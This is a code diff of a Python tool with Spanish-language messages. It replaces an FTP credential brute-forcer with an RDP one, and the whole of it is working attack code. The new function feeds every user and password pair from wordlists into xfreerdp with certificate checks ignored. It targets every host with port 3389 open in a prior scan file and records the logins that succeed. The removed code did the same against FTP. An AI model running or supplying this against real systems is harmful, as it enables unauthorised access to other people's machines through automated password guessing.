@@ -1,14 +1,13 @@
+import subprocess
 import os
 import json
-from ftplib import FTP
 
-FTP_RESULTS_DIR = "results/ftp"
+RDP_RESULTS_DIR = "results/rdp"
 WORDLIST_USER = "wordlists/users.txt"
 WORDLIST_PASS = "wordlists/passwords.txt"
-SCAN_RESULTS_FILE = "results/scan_results.json"
 
-def fuerza_bruta_ftp(ip, port=21):
-    os.makedirs(FTP_RESULTS_DIR, exist_ok=True)
+def fuerza_bruta_rdp(ip, port=3389):
+    os.makedirs(RDP_RESULTS_DIR, exist_ok=True)
     resultados = {
         "host": ip,
         "port": port,
@@ -17,41 +16,42 @@ def fuerza_bruta_ftp(ip, port=21):
 
     with open(WORDLIST_USER, "r") as f:
         usuarios = [line.strip() for line in f if line.strip()]
+
     with open(WORDLIST_PASS, "r") as f:
         contrasenas = [line.strip() for line in f if line.strip()]
 
-    print(f"[*] Iniciando fuerza bruta FTP contra {ip}:{port}...")
+    print(f"[*] Iniciando fuerza bruta RDP contra {ip}:{port}...")
 
     for usuario in usuarios:
         for contrasena in contrasenas:
-            try:
-                ftp = FTP()
-                ftp.connect(ip, port, timeout=3)
-                ftp.login(usuario, contrasena)
+            comando = [
+                "xfreerdp", f"/u:{usuario}", f"/p:{contrasena}", f"/v:{ip}:{port}", "+auth-only",
+                "/cert:ignore"
+            ]
+            resultado = subprocess.run(comando, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            salida = resultado.stdout.decode() + resultado.stderr.decode()
+
+            if "Authentication only, exit status 0" in salida:
                 print(f"[+] Credenciales válidas encontradas: {usuario}:{contrasena}")
                 resultados["valid_credentials"].append({"usuario": usuario, "password": contrasena})
-                ftp.quit()
-            except Exception:
-                continue
 
-    salida = os.path.join(FTP_RESULTS_DIR, f"ftp_{ip}_bruteforce.json")
-    with open(salida, "w") as f:
+    ruta_salida = os.path.join(RDP_RESULTS_DIR, f"rdp_{ip}_bruteforce.json")
+    with open(ruta_salida, "w") as f:
         json.dump(resultados, f, indent=4)
 
-    print(f"[+] Resultados guardados en {salida}")
+    print(f"[+] Resultados guardados en {ruta_salida}")
     return resultados
 
-def run_ftp_attack():
-    if not os.path.exists(SCAN_RESULTS_FILE):
-        print(f"[!] Archivo de escaneo no encontrado: {SCAN_RESULTS_FILE}")
-        return
+def run_rdp_attack():
 
-    with open(SCAN_RESULTS_FILE, "r") as f:
+    with open("results/scan_results.json") as f:
         data = json.load(f)
 
-    for host in data.get("hosts", []):
+    hosts = data.get("hosts", [])
+
+    for host in hosts:
         ip = host.get("ip")
         for port_info in host.get("open_ports", []):
-            if port_info.get("port") == 21:
-                fuerza_bruta_ftp(ip)
+            if port_info.get("port") == 3389:
+                fuerza_bruta_rdp(ip)
                 break
